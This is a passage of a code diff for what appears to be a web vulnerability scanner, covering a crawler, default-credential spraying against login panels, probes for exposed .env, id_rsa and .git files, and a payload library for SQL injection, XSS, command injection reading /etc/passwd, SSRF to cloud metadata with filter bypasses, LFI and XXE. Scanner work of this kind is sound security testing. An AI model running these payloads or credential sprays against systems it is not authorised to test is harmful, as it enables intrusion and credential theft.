+                            f"An attacker can enumerate object IDs to access other users' data."
+                        ),
+                    })
+                    return  # one confirmed IDOR per endpoint is enough
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # AUTH PANELS + DEFAULT CREDENTIALS  (NEW)
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_auth_panels(self, client, base_url: str):
+        """
+        1. Find exposed admin / login panels.
+        2. Try default credentials against each one.
+        3. Check for missing account lockout.
+        """
+        base = base_url.rstrip("/")
+
+        for path in AUTH_PANEL_PATHS:
+            url = base + path
+            res = await self._req(client, "GET", url)
+            if not res or res.status_code not in (200, 401, 403):
+                continue
+
+            body_lower = res.text.lower()
+            # Confirm it's actually a login page
+            has_login_form = any(kw in body_lower for kw in
+                                 ("password", "passwd", "login", "sign in", "username"))
+            if not has_login_form:
+                continue
+
+            logger.info(f"[AUTH] Login panel found: {url}")
+
+            # ── Default credential spray ──────────────────────────────────────
+            # Identify likely field names from the form
+            u_field = self._guess_field(body_lower, USERNAME_FIELDS)
+            p_field = self._guess_field(body_lower, PASSWORD_FIELDS)
+
+            successful_cred = None
+            for username, password in DEFAULT_CREDS:
+                data = {u_field: username, p_field: password}
+                login_res = await self._req(client, "POST", url, data=data, timeout=10)
+                if not login_res:
+                    continue
+
+                # Signs of successful login: redirect, dashboard keywords, no "invalid"
+                if login_res.status_code in (301, 302, 303):
+                    loc = login_res.headers.get("location", "")
+                    if any(kw in loc.lower() for kw in ("dashboard","admin","panel","home")):
+                        successful_cred = (username, password)
+                        break
+
+                lr_body = login_res.text.lower()
+                if (any(kw in lr_body for kw in ("dashboard","logout","welcome","signed in"))
+                        and not any(kw in lr_body for kw in ("invalid","incorrect","failed","error"))):
+                    successful_cred = (username, password)
+                    break
+
+            if successful_cred:
+                self._add_finding({
+                    "type": "Default Credentials Accepted",
+                    "subtype": path,
+                    "url": url, "parameter": "login form",
+                    "payload": f"{successful_cred[0]} / {successful_cred[1]}",
+                    "severity": "Critical", "confidence": 0.95,
+                    "evidence": f"Login succeeded with {successful_cred[0]}:{successful_cred[1]}",
+                    "description": (
+                        f"The admin panel at {url} accepted the default credential "
+                        f"'{successful_cred[0]}' / '{successful_cred[1]}'. "
+                        f"An attacker gains immediate administrative access."
+                    ),
+                })
+            else:
+                # ── Account lockout check ─────────────────────────────────────
+                # Send 10 rapid wrong logins and check for lockout signals
+                locked = False
+                for _ in range(10):
+                    r = await self._req(client, "POST", url,
+                                        data={u_field: "admin", p_field: "wrongpassword999"},
+                                        timeout=8)
+                    if r and r.status_code == 429:
+                        locked = True
+                        break
+                    if r and any(kw in r.text.lower() for kw in
+                                 ("locked", "too many", "blocked", "captcha", "temporarily")):
+                        locked = True
+                        break
+
+                if not locked:
+                    self._add_finding({
+                        "type": "Missing Account Lockout",
+                        "subtype": path,
+                        "url": url, "parameter": "login form",
+                        "payload": "10 rapid wrong-password attempts",
+                        "severity": "Medium", "confidence": 0.85,
+                        "evidence": "10 consecutive failed logins — no lockout, CAPTCHA, or 429 returned",
+                        "description": (
+                            f"The login at {url} does not enforce account lockout or rate limiting. "
+                            f"An attacker can brute-force credentials without restriction."
+                        ),
+                    })
+
+    def _guess_field(self, html: str, candidates: list) -> str:
+        """Return the first candidate field name found in the HTML, or the first candidate."""
+        for c in candidates:
+            if f'name="{c}"' in html or f"name='{c}'" in html:
+                return c
+        return candidates[0]
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SECURITY HEADERS
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _check_security_headers(self, client, base_url: str):
+        res = await self._req(client, "GET", base_url)
+        if not res:
+            return
+        h = {k.lower(): v for k, v in res.headers.items()}
+
+        REQUIRED = {
+            "content-security-policy":   ("Medium", "No CSP — inline scripts and untrusted sources can execute."),
+            "x-frame-options":           ("Medium", "No X-Frame-Options — clickjacking possible."),
+            "x-content-type-options":    ("Low",    "No X-Content-Type-Options: nosniff."),
+            "strict-transport-security": ("Medium", "No HSTS — downgrade to HTTP possible."),
+            "referrer-policy":           ("Low",    "No Referrer-Policy — URL data may leak."),
+            "permissions-policy":        ("Low",    "No Permissions-Policy set."),
+        }
+        for header, (severity, desc) in REQUIRED.items():
+            if header not in h:
+                self._add_finding({
+                    "type": "Missing Security Header", "subtype": header.title(),
+                    "url": base_url, "severity": severity, "confidence": 1.0,
+                    "evidence": f"'{header}' absent", "description": desc,
+                })
+
+        # CORS
+        cors_res = await self._req(client, "GET", base_url, headers={"Origin": "https://evil.com"})
+        if cors_res:
+            acao = cors_res.headers.get("access-control-allow-origin", "")
+            acac = cors_res.headers.get("access-control-allow-credentials", "").lower()
+            if acao == "*" and acac == "true":
+                self._add_finding({
+                    "type": "CORS Misconfiguration", "subtype": "Wildcard + Credentials",
+                    "url": base_url, "severity": "Critical", "confidence": 1.0,
+                    "evidence": f"ACAO={acao} ACAC={acac}",
+                    "description": "Wildcard CORS + credentials — any origin can make authenticated requests.",
+                })
+            elif acao == "https://evil.com":
+                self._add_finding({
+                    "type": "CORS Misconfiguration", "subtype": "Reflected Origin",
+                    "url": base_url, "severity": "High", "confidence": 0.95,
+                    "evidence": f"Reflected Origin: {acao}",
+                    "description": "Server echoes any Origin header — all origins allowed.",
+                })
+
+        # Leaky headers
+        for hdr, desc in {
+            "x-powered-by": "Backend tech exposed", "server": "Server version exposed",
+            "x-aspnet-version": "ASP.NET version exposed",
+        }.items():
+            if hdr in h:
+                self._add_finding({
+                    "type": "Information Disclosure", "subtype": "Response Header",
+                    "url": base_url, "severity": "Low", "confidence": 1.0,
+                    "evidence": f"{hdr}: {h[hdr]}", "description": desc,
+                })
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # INFO DISCLOSURE — sensitive files & directory listing
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _check_info_disclosure(self, client, base_url: str):
+        base = base_url.rstrip("/")
+
+        SENSITIVE = [
+            ("/.env",               ["DB_PASSWORD","SECRET_KEY","AWS_","API_KEY"]),
+            ("/.env.production",    ["DB_PASSWORD","SECRET_KEY"]),
+            ("/.env.local",         ["DB_PASSWORD","SECRET_KEY"]),
+            ("/.git/HEAD",          ["ref:","refs/heads"]),
+            ("/.git/config",        ["[core]","repositoryformatversion"]),
+            ("/web.config",         ["connectionString","appSettings"]),
+            ("/config.php",         ["password","database","$db"]),
+            ("/config.yml",         ["password:","secret:","database:"]),
+            ("/phpinfo.php",        ["PHP Version","phpinfo()"]),
+            ("/server-status",      ["Apache Server Status","requests currently"]),
+            ("/actuator/env",       ["systemProperties","applicationConfig"]),
+            ("/actuator/mappings",  ["dispatcherServlet"]),
+            ("/actuator/health",    ["status","diskSpace"]),
+            ("/trace",              ["TRACE","Host:","Cookie:"]),
+            ("/backup.sql",         ["INSERT INTO","CREATE TABLE"]),
+            ("/dump.sql",           ["INSERT INTO","CREATE TABLE"]),
+            ("/db.sql",             ["INSERT INTO","CREATE TABLE"]),
+            ("/id_rsa",             ["-----BEGIN","PRIVATE KEY"]),
+            ("/composer.json",      ["require","autoload"]),
+            ("/package.json",       ["dependencies","scripts"]),
+            ("/wp-config.php.bak",  ["DB_PASSWORD","DB_HOST"]),
+        ]
+        for path, indicators in SENSITIVE:
+            url = base + path
+            res = await self._req(client, "GET", url)
+            if res and res.status_code == 200:
+                for ind in indicators:
+                    if ind.lower() in res.text.lower():
+                        self._add_finding({
+                            "type": "Sensitive File Exposed", "subtype": path,
+                            "url": url, "severity": "Critical", "confidence": 0.97,
+                            "evidence": f"Indicator '{ind}' in response",
+                            "description": f"File {path} is publicly accessible and contains sensitive data.",
+                        })
+                        break
+
+        LISTING = ["Index of /", "Directory listing", "Parent Directory"]
+        for d in ["/images/","/uploads/","/files/","/backup/","/logs/","/tmp/","/data/","/export/"]:
+            url = base + d
+            res = await self._req(client, "GET", url)
+            if res and res.status_code == 200 and any(m in res.text for m in LISTING):
+                self._add_finding({
+                    "type": "Directory Listing Enabled", "subtype": d,
+                    "url": url, "severity": "Medium", "confidence": 0.99,
+                    "evidence": "Directory index page returned",
+                    "description": f"Directory listing at {d} lets attackers enumerate all files.",
+                })
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # DEDUPLICATION
+    # ─────────────────────────────────────────────────────────────────────────
+    def _add_finding(self, f: dict):
+        key = "::".join([f.get("type",""), f.get("url",""),
+                         f.get("parameter",""), f.get("payload","")[:30]])
+        if key in self._seen_findings:
+            return
+        self._seen_findings.add(key)
+        self.findings.append(f)
+        logger.info(f"[FINDING] {f['severity']:8s} | {f['type']:45s} | {f.get('url','')}")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# AI FALSE-POSITIVE FILTER  (called from scan_worker.py after scan completes)
+# ─────────────────────────────────────────────────────────────────────────────
+async def filter_false_positives(findings: list, brain) -> list:
+    """
+    Run each finding through the AI brain to remove noise.
+    Drop findings where the AI judges them invalid or low-confidence.
+
+    Usage in scan_worker.py:
+        from scanner.dast.active_scanner import ActiveScanner, filter_false_positives
+        from scanner.ai_brain import AIBrain
+
+        brain    = AIBrain()
+        scanner  = ActiveScanner()
+        findings = await scanner.scan(url)
+        findings = await filter_false_positives(findings, brain)
+    """
+    validated = []
+    for finding in findings:
+        try:
+            result = await brain.validate_finding(finding)
+            if result.get("valid") and result.get("confidence", 0) >= 0.6:
+                finding["ai_confidence"]  = result["confidence"]
+                finding["ai_explanation"] = result.get("reason", "")
+                # Let AI upgrade severity if it sees something we missed
+                if result.get("severity") in ("Critical", "High"):
+                    finding["severity"] = result["severity"]
+                validated.append(finding)
+            else:
+                logger.info(
+                    f"[AI FILTER] Dropped: {finding['type']} at {finding.get('url','')} "
+                    f"— AI confidence={result.get('confidence',0):.2f}"
+                )
+        except Exception as e:
+            logger.warning(f"[AI FILTER] Error on finding: {e}")
+            validated.append(finding)  # keep on error rather than lose data
+    return validated
+
+
+==================== FILE: scanner\dast\crawler.py ====================
+
+# scanner/dast/crawler.py
+import asyncio, logging, re
+from urllib.parse import urljoin, urlparse, urlunparse
+from bs4 import BeautifulSoup
+import httpx
+
+logger = logging.getLogger(__name__)
+
+COMMON_HIDDEN_PATHS = [
+    "/admin", "/admin/login", "/administrator", "/login", "/signin",
+    "/signup", "/register", "/api", "/api/v1", "/api/v2", "/graphql",
+    "/wp-admin", "/wp-login.php", "/.env", "/.git/HEAD",
+    "/robots.txt", "/sitemap.xml", "/.htaccess", "/server-status",
+    "/actuator/health", "/actuator/env", "/debug", "/console",
+    "/user", "/users", "/profile", "/account", "/dashboard",
+    "/panel", "/manage", "/upload", "/uploads", "/files",
+    "/search", "/find", "/query", "/forgot", "/reset",
+    "/phpmyadmin", "/backup", "/config.php", "/web.config",
+]
+
+BLOCKED_EXTENSIONS = {
+    ".jpg",".jpeg",".png",".gif",".webp",".svg",".ico",
+    ".css",".woff",".woff2",".ttf",".otf",".eot",
+    ".pdf",".zip",".tar",".gz",".rar",
+    ".mp4",".mp3",".avi",".wav",".pyc",".class",".exe",
+}
+
+
+class Crawler:
+    def __init__(self, base_url: str, max_pages: int = 120, max_depth: int = 4):
+        self.base_url  = base_url.rstrip("/")
+        self.base_host = urlparse(base_url).netloc
+        self.max_pages = max_pages
+        self.max_depth = max_depth
+        self.visited   = set()
+        self.endpoints = set()
+        self.forms     = []
+
+    async def crawl(self, client: httpx.AsyncClient):
+        await self._crawl_page(client, self.base_url, 0)
+        await self._probe_hidden_paths(client)
+        await self._parse_robots(client)
+        logger.info(f"[CRAWL] {len(self.endpoints)} endpoints, {len(self.forms)} forms")
+        return list(self.endpoints), self.forms
+
+    async def _crawl_page(self, client, url: str, depth: int):
+        url = self._normalize(url)
+        if (url in self.visited or len(self.visited) >= self.max_pages
+                or depth > self.max_depth or not self._is_valid(url)
+                or not self._is_same_domain(url)):
+            return
+        self.visited.add(url)
+        logger.debug(f"[CRAWL] d={depth} {url}")
+        try:
+            res = await client.get(url, timeout=12)
+        except Exception as e:
+            logger.debug(f"[CRAWL ERR] {url}: {e}")
+            return
+        self.endpoints.add(url)
+        ct = res.headers.get("content-type", "")
+        if "text/html" not in ct:
+            return
+        soup = BeautifulSoup(res.text, "html.parser")
+        self._extract_forms(soup, url)
+        await self._extract_js_endpoints(client, soup, url)
+        tasks = []
+        for tag in soup.find_all("a", href=True):
+            full = self._normalize(urljoin(url, tag["href"].strip()))
+            if full not in self.visited and self._is_same_domain(full) and self._is_valid(full):
+                tasks.append(self._crawl_page(client, full, depth + 1))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    def _extract_forms(self, soup, page_url: str):
+        for form in soup.find_all("form"):
+            action = urljoin(page_url, form.get("action") or page_url)
+            method = form.get("method", "get").upper()
+            inputs = {}
+            for inp in form.find_all(["input", "textarea", "select"]):
+                name = inp.get("name")
+                if not name:
+                    continue
+                itype = inp.get("type", "text").lower()
+                if itype == "email":     inputs[name] = "test@test.com"
+                elif itype == "password": inputs[name] = "password123"
+                elif itype in ("hidden", "submit", "button"):
+                    inputs[name] = inp.get("value", "1")
+                else: inputs[name] = inp.get("value", "test")
+            obj = {"url": action, "method": method, "inputs": inputs, "page": page_url}
+            if obj not in self.forms:
+                self.forms.append(obj)
+                self.endpoints.add(action)
+
+    async def _extract_js_endpoints(self, client, soup, page_url: str):
+        for tag in soup.find_all("script"):
+            if tag.string:
+                self._mine_js(tag.string)
+            src = tag.get("src")
+            if src and self._is_same_domain(urljoin(page_url, src)):
+                try:
+                    r = await client.get(urljoin(page_url, src), timeout=8)
+                    self._mine_js(r.text)
+                except Exception:
+                    pass
+
+    def _mine_js(self, text: str):
+        pats = [
+            r'["'`](/(?:api|v\d+|graphql|auth|user|admin|search)[a-zA-Z0-9/_\-\.?=&]*)[`"\']',
+            r'fetch\s*\(\s*["'`]([^"'`\s]+)["'`]',
+            r'axios\.\w+\s*\(\s*["'`]([^"'`\s]+)["'`]',
+        ]
+        for pat in pats:
+            for m in re.findall(pat, text):
+                if m.startswith("/") and len(m) > 1:
+                    full = urljoin(self.base_url, m)
+                    if self._is_same_domain(full) and self._is_valid(full):
+                        self.endpoints.add(full)
+
+    async def _probe_hidden_paths(self, client):
+        async def probe(path):
+            url = self.base_url + path
+            try:
+                r = await client.get(url, timeout=6)
+                if r.status_code not in (404, 410, 400):
+                    self.endpoints.add(url)
+            except Exception:
+                pass
+        await asyncio.gather(*[probe(p) for p in COMMON_HIDDEN_PATHS], return_exceptions=True)
+
+    async def _parse_robots(self, client):
+        for path in ["/robots.txt", "/sitemap.xml"]:
+            try:
+                r = await client.get(self.base_url + path, timeout=6)
+                if r.status_code == 200:
+                    for line in r.text.splitlines():
+                        line = line.strip()
+                        if ":" in line:
+                            parts = line.split(":", 1)
+                            val = parts[1].strip()
+                            if val.startswith("/"):
+                                self.endpoints.add(self.base_url + val)
+                            elif val.startswith("http") and self._is_same_domain(val):
+                                self.endpoints.add(val)
+            except Exception:
+                pass
+
+    def _is_same_domain(self, url: str) -> bool:
+        try: return urlparse(url).netloc == self.base_host
+        except: return False
+
+    def _is_valid(self, url: str) -> bool:
+        try:
+            p = urlparse(url).path.lower()
+            return not any(p.endswith(e) for e in BLOCKED_EXTENSIONS)
+        except: return False
+
+    def _normalize(self, url: str) -> str:
+        try:
+            p = urlparse(url)
+            return urlunparse((p.scheme, p.netloc, p.path.rstrip("/") or "/", p.params, p.query, ""))
+        except: return url
+
+
 ==================== FILE: scanner\dast\param_engine.py ====================
 
+# scanner/dast/param_engine.py
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
+INTERESTING_PARAMS = [
+    "id","user","uid","userid","user_id","account","item","product",
+    "q","query","search","keyword","term","s","k",
+    "page","p","pg","offset","limit","start","num",
+    "file","path","dir","folder","document","doc","name",
+    "url","link","redirect","next","return","dest","goto","redir",
+    "cat","category","type","action","view","mode","tab",
+    "lang","language","locale","region",
+    "token","key","api_key","auth","session","sid",
+    "order","sort","by","filter","orderby","sortby",
+    "email","username","phone",
+    "ref","referrer","source","from","origin",
+    "callback","jsonp","format","output",
+    "debug","test","preview","draft",
+]
+
 class ParamEngine:
+    def extract_params(self, url: str) -> list:
+        return list(parse_qs(urlparse(url).query).keys())
 
-    def extract_params(self, url):
+    def inject_payload(self, url: str, param: str, payload: str) -> str:
         parsed = urlparse(url)
-        return list(parse_qs(parsed.query).keys())
-
-    def inject_payload(self, url, param, payload):
-        parsed = urlparse(url)
-        query = parse_qs(parsed.query)
-
+        query  = parse_qs(parsed.query, keep_blank_values=True)
         query[param] = [payload]
-
-        new_query = urlencode(query, doseq=True)
-
         return urlunparse((
-            parsed.scheme,
-            parsed.netloc,
-            parsed.path,
-            parsed.params,
-            new_query,
-            parsed.fragment
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(query, doseq=True), parsed.fragment
         ))
+
+    def add_param_variants(self, url: str) -> list:
+        """Return URL variants with common params added if none exist."""
+        if "?" in url:
+            return [url]
+        # Try adding common params to param-less URLs
+        variants = []
+        for param in INTERESTING_PARAMS[:10]:
+            variants.append(f"{url}?{param}=1")
+        return variants
+
+
+==================== FILE: scanner\dast\payloads.py ====================
+
+# scanner/dast/payloads.py
+# -----------------------------------------------------------------------------
+# CORTEX SENTINEL: COMPREHENSIVE VULNERABILITY PAYLOAD LIBRARY
+# -----------------------------------------------------------------------------
+
+# --- SQL INJECTION (SQLi) ---
+# Focused on triggering database errors or time-delays
+SQLI_PAYLOADS = [
+    "'", '"', "\\", "1'",                      # Classic break-strings
+    "1' OR '1'='1'--", "1' OR 1=1#",           # Auth bypass / Boolean
+    "' UNION SELECT NULL,NULL,NULL--",         # Union discovery
+    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Time-based (MySQL)
+    "1' AND 49=49--",                          # Verification logic
+]
+
+# Markers found in HTTP responses that confirm SQLi
+SQLI_ERROR_SIGNATURES = [
+    "you have an error in your sql syntax",
+    "unclosed quotation mark after the character string",
+    "mysql_fetch_array()",
+    "PostgreSQL query failed:",
+    "ORA-00933: SQL command not properly ended",
+]
+
+# --- CROSS-SITE SCRIPTING (XSS) ---
+# Designed for both reflected and DOM-based detection
+XSS_PAYLOADS = [
+    "<script>alert('SENTINEL_VULN')</script>",
+    "\"><script>alert('SENTINEL_VULN')</script>",
+    "<img src=x onerror=alert('SENTINEL_VULN')>",
+    "javascript:alert('SENTINEL_VULN')",
+    "<svg onload=alert('SENTINEL_VULN')>",
+]
+
+# --- COMMAND INJECTION (CMDI) ---
+# Covers Linux, Windows, and Blind scenarios
+CMDI_PAYLOADS = [
+    # Linux/Unix Reflected & Blind
+    "; echo 'SENTINEL_VULN'; #", 
+    "; sleep 5; #",
+    "$(sleep 5)",
+    # Windows Blind
+    "& timeout /t 5 &",
+    # Path traversal combined with CMDI
+    "; cat /etc/passwd; #",
+]
+
+# --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
+# Includes WAF bypasses using different IP representations
+SSRF_PAYLOADS = [
+    "http://169.254.169.254/latest/meta-data/",      # AWS/OpenStack Metadata
+    "http://169.254.169.254/computeMetadata/v1/",    # GCP Metadata
+    "http://0251.0376.0251.0376/",                   # Octal Bypass (169.254...)
+    "http://2852039166/",                            # Decimal Bypass (169.254...)
+    "http://localhost:80",                           # Internal Port Scan
+    "http://[::1]",                                  # IPv6 Loopback
+]
+
+# --- LOCAL FILE INCLUSION (LFI) ---
+# Targeting sensitive system configuration files
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "../../../../etc/hosts",
+    "../../../../windows/win.ini",                  # Windows Target
+    "....//....//....//....//etc/passwd",           # Double-filter bypass
+    "/proc/self/environ",                           # Log poisoning target
+]
+
+# --- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
+# Payloads that yield a predictable mathematical result
+SSTI_PAYLOADS = [
+    "{{7*7}}",      # Jinja2 / Twig / Smarty (Result: 49)
+    "${7*7}",       # Mako / Spring (Result: 49)
+    "<%= 7*7 %>",   # ERB / Ruby (Result: 49)
+    "#{7*7}",       # Pug (Result: 49)
+]
+
+# --- OPEN REDIRECT ---
+# Tests if the application redirects to external untrusted domains
+OPEN_REDIRECT_PAYLOADS = [
+    "https://google.com",
+    "//google.com",
+    "/\\google.com",
+    "/%09/google.com",
+]
+
+# --- XML EXTERNAL ENTITY (XXE) ---
+# Formatted as raw strings to preserve XML structure
+XXE_PAYLOADS = [
+    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+]
 
 ==================== FILE: scanner\dast\payload_mutator.py ====================
 
+# scanner/dast/payload_mutator.py
 import urllib.parse
 
 class PayloadMutator:
-
-    def mutate(self, payload):
+    def mutate(self, payload: str) -> list:
         return [
             payload,
             urllib.parse.quote(payload),
+            urllib.parse.quote(urllib.parse.quote(payload)),   # double-encode
             payload.replace("<", "%3C").replace(">", "%3E"),
             payload.replace("script", "scr<script>ipt"),
+            payload.replace(" ", "/**/"),
+            payload.upper(),
         ]
+
 
 ==================== FILE: scanner\dast\priority_engine.py ====================
 
-# scanner/priority_engine.py
-
-
+# scanner/dast/priority_engine.py
 class PriorityEngine:
+    HIGH_RISK   = ["admin","login","auth","account","api","checkout","user","password","upload","file"]
+    MEDIUM_RISK = ["search","query","filter","find","id","view","page"]
 
-    # -------------------------
-    # KEYWORD LISTS
-    # -------------------------
-    HIGH_RISK = ["admin", "login", "auth", "account", "api", "checkout"]
-    MEDIUM_RISK = ["search", "query", "filter"]
-
-    # Attack selection keywords (merged from attack_planner.py)
-    AUTH_KEYWORDS = ["login", "auth"]
-    SEARCH_KEYWORDS = ["search", "query"]
-
-    # -------------------------
-    # SCORING
-    # -------------------------
-    def score_endpoint(self, url):
+    def score_endpoint(self, url: str) -> int:
         score = 0
-
-        for word in self.HIGH_RISK:
-            if word in url:
-                score += 5
-
-        for word in self.MEDIUM_RISK:
-            if word in url:
-                score += 3
-
-        # Parameter bonus — URLs with query strings are higher priority
-        if "?" in url:
-            score += 4
-
+        url_l = url.lower()
+        for w in self.HIGH_RISK:
+            if w in url_l: score += 5
+        for w in self.MEDIUM_RISK:
+            if w in url_l: score += 3
+        if "?" in url: score += 4
         return score
 
-    # -------------------------
-    # PRIORITIZE
-    # -------------------------
-    def prioritize(self, endpoints):
-        scored = [(url, self.score_endpoint(url)) for url in endpoints]
+    def prioritize(self, endpoints: list) -> list:
+        scored = [(u, self.score_endpoint(u)) for u in endpoints]
         scored.sort(key=lambda x: x[1], reverse=True)
-        return [url for url, _ in scored]
+        return [u for u, _ in scored]
 
-    # -------------------------
-    # CHOOSE ATTACKS
-    # (moved from scanner/attack_planner.py)
-    # -------------------------
-    def choose_attacks(self, url):
-        """
-        Returns a list of attack types to run against a given URL
-        based on the nature of the endpoint.
-        """
-        if any(k in url for k in self.AUTH_KEYWORDS):
-            return ["sqli", "bruteforce"]
+    def choose_attacks(self, url: str) -> list:
+        url_l = url.lower()
+        attacks = ["xss"]
+        if any(k in url_l for k in ["login","auth","user","password","account"]):
+            attacks = ["sqli","xss","lfi"]
+        elif any(k in url_l for k in ["search","query","find","q=","s="]):
+            attacks = ["xss","sqli","ssti"]
+        elif any(k in url_l for k in ["file","path","dir","doc","download"]):
+            attacks = ["lfi","xss"]
+        elif any(k in url_l for k in ["redirect","next","return","dest","url"]):
+            attacks = ["open_redirect","xss"]
+        return attacks
 
-        if any(k in url for k in self.SEARCH_KEYWORDS):
-            return ["xss", "sqli"]
-
-        return ["xss"]
 
 ==================== FILE: scanner\dast\rate_limiter.py ====================
 
+# scanner/dast/rate_limiter.py
 import time
 from urllib.parse import urlparse
-
 
 class RateLimiter:
     def __init__(self):
         self.last_request = {}
 
-    def _normalize(self, identifier: str) -> str:
-        key = str(identifier)
-        if "://" in key:
-            try:
-                key = urlparse(key).netloc
-            except Exception:
-                pass
-        return key
+    def _key(self, identifier: str) -> str:
+        k = str(identifier)
+        if "://" in k:
+            try: k = urlparse(k).netloc
+            except: pass
+        return k
 
-    def allow(self, identifier, delay: float = 2.0) -> bool:
-        """Return True if the request is allowed, False if rate-limited."""
-        key = self._normalize(identifier)
+    def allow(self, identifier, delay: float = 0.5) -> bool:
+        key = self._key(identifier)
         now = time.time()
         if key in self.last_request and (now - self.last_request[key]) < delay:
             return False
         self.last_request[key] = now
         return True
 
-    def wait(self, identifier, delay: float = 2.0) -> None:
-        """Block until the rate limit window has passed, then mark the request."""
-        key = self._normalize(identifier)
+    def wait(self, identifier, delay: float = 0.5) -> None:
+        key = self._key(identifier)
         now = time.time()
         if key in self.last_request:
             elapsed = now - self.last_request[key]
@@ -3203,88 +4209,10 @@ class RateLimiter:
                 time.sleep(delay - elapsed)
         self.last_request[key] = time.time()
 
-    def get_remaining_wait(self, identifier, delay: float = 2.0) -> float:
-        key = self._normalize(identifier)
-        if key in self.last_request:
-            remaining = delay - (time.time() - self.last_request[key])
-            return max(0.0, remaining)
-        return 0.0
+
+==================== FILE: scanner\dast\__init__.py ====================
 
 
-==================== FILE: scanner\dast\smart_crawler.py ====================
-
-# scanner/smart_crawler.py
-
-import httpx
-import logging
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
-
-
-class SmartCrawler:
-    """
-    Lightweight async crawler used by crawl_workers.py.
-    Stays within the same domain and avoids binary/asset URLs.
-    """
-
-    BLOCKED_EXTENSIONS = {
-        ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg",
-        ".css", ".woff", ".woff2", ".ttf", ".otf",
-        ".ico", ".pdf", ".zip", ".mp4", ".mp3"
-    }
-
-    def __init__(self, max_pages=50):
-        self.max_pages = max_pages
-
-    def _is_valid(self, url):
-        from urllib.parse import urlparse as _parse
-        path = _parse(url).path.lower()
-        return not any(path.endswith(ext) for ext in self.BLOCKED_EXTENSIONS)
-
-    def _same_domain(self, url, base_url):
-        return urlparse(url).netloc == urlparse(base_url).netloc
-
-    async def crawl(self, base_url):
-        """
-        Crawl base_url and return a list of discovered same-domain endpoints.
-        Creates its own httpx client internally so it can be called
-        directly from the worker without passing a client.
-        """
-        visited   = set()
-        endpoints = set()
-        queue     = [base_url]
-
-        async with httpx.AsyncClient(
-            verify=False,
-            follow_redirects=True,
-            timeout=10
-        ) as client:
-            while queue and len(visited) < self.max_pages:
-                url = queue.pop(0)
-
-                if url in visited or not self._is_valid(url):
-                    continue
-
-                visited.add(url)
-                endpoints.add(url)
-
-                try:
-                    res  = await client.get(url)
-                    soup = BeautifulSoup(res.text, "html.parser")
-
-                    for tag in soup.find_all("a", href=True):
-                        full = urljoin(base_url, tag["href"])
-                        if (
-                            full not in visited
-                            and self._same_domain(full, base_url)
-                            and self._is_valid(full)
-                        ):
-                            queue.append(full)
-
-                except Exception as e:
-                    logging.debug(f"[SMART CRAWL] {url}: {e}")
-
-        return list(endpoints)
 
 ==================== FILE: scanner\exploit\exploit_engine.py ====================
 
@@ -4327,38 +5255,62 @@ class NetworkEngine:
 
 ==================== FILE: storage\aggregation_store.py ====================
 
-import redis
+# storage/aggregation_store.py
 import os
 import json
+import redis
 
+# Configuration
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
-r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
+# Initialize Redis Connection
+try:
+    r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+except Exception:
+    r = None
 
-def add_findings(job_id, findings):
+def add_findings(job_id: str, findings: list):
+    """
+    Appends new findings to the aggregation bucket for a job.
+    Includes deduplication and a 24-hour expiration.
+    """
+    if r is None:
+        return
+
     key = f"agg:{job_id}"
-    existing = r.get(key)
-    data = json.loads(existing) if existing else []
+    
+    # 1. Retrieve existing findings
+    existing_data = r.get(key)
+    data = json.loads(existing_data) if existing_data else []
+    
+    # 2. Merge new findings
     data.extend(findings)
-
-    # Deduplicate by (type, url, payload)
-    unique = {}
+    
+    # 3. Deduplicate based on type, url, and a snippet of the payload
+    seen, unique = set(), []
     for f in data:
-        k = f"{f.get('type')}_{f.get('url')}_{f.get('payload', '')}"
-        unique[k] = f
+        # Create a unique signature for each finding
+        k = f"{f.get('type')}::{f.get('url')}::{f.get('payload','')[:30]}"
+        if k not in seen:
+            seen.add(k)
+            unique.append(f)
+    
+    # 4. THE FIX: Save back to Redis with a 24-hour (86400s) TTL
+    # This prevents memory leaks if clear() is never called.
+    r.set(key, json.dumps(unique), ex=86400)
 
-    r.set(key, json.dumps(list(unique.values())))
-
-
-def get_findings(job_id):
-    key = f"agg:{job_id}"
-    data = r.get(key)
+def get_findings(job_id: str) -> list:
+    """Retrieves all findings currently aggregated for a job."""
+    if r is None:
+        return []
+    data = r.get(f"agg:{job_id}")
     return json.loads(data) if data else []
 
-
-def clear(job_id):
+def clear(job_id: str):
+    """Manually deletes the aggregation bucket (called after report generation)."""
+    if r is None:
+        return
     r.delete(f"agg:{job_id}")
-
 
 ==================== FILE: storage\database.py ====================
 
@@ -4456,6 +5408,10 @@ class DatabaseManager:
         return res.data
 
 
+==================== FILE: storage\__init__.py ====================
+
+
+
 ==================== FILE: task_queue\queues.py ====================
 
 # task_queue/queues.py
@@ -4468,73 +5424,77 @@ EXPLOIT_QUEUE     = "exploit_queue"
 AGGREGATION_QUEUE = "aggregation_queue"
 REPORT_QUEUE      = "report_queue"
 NETWORK_QUEUE     = "network_queue"
-MOBILE_QUEUE      = "mobile_queue"
 API_QUEUE         = "api_queue"
 
 
 ==================== FILE: task_queue\redis_client.py ====================
 
-# task_queue/redis_client.py
-
 import redis
 import json
+import logging
 import os
 import time
-import logging
 
-# Load environment variables
+# Configuration
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
-
-try:
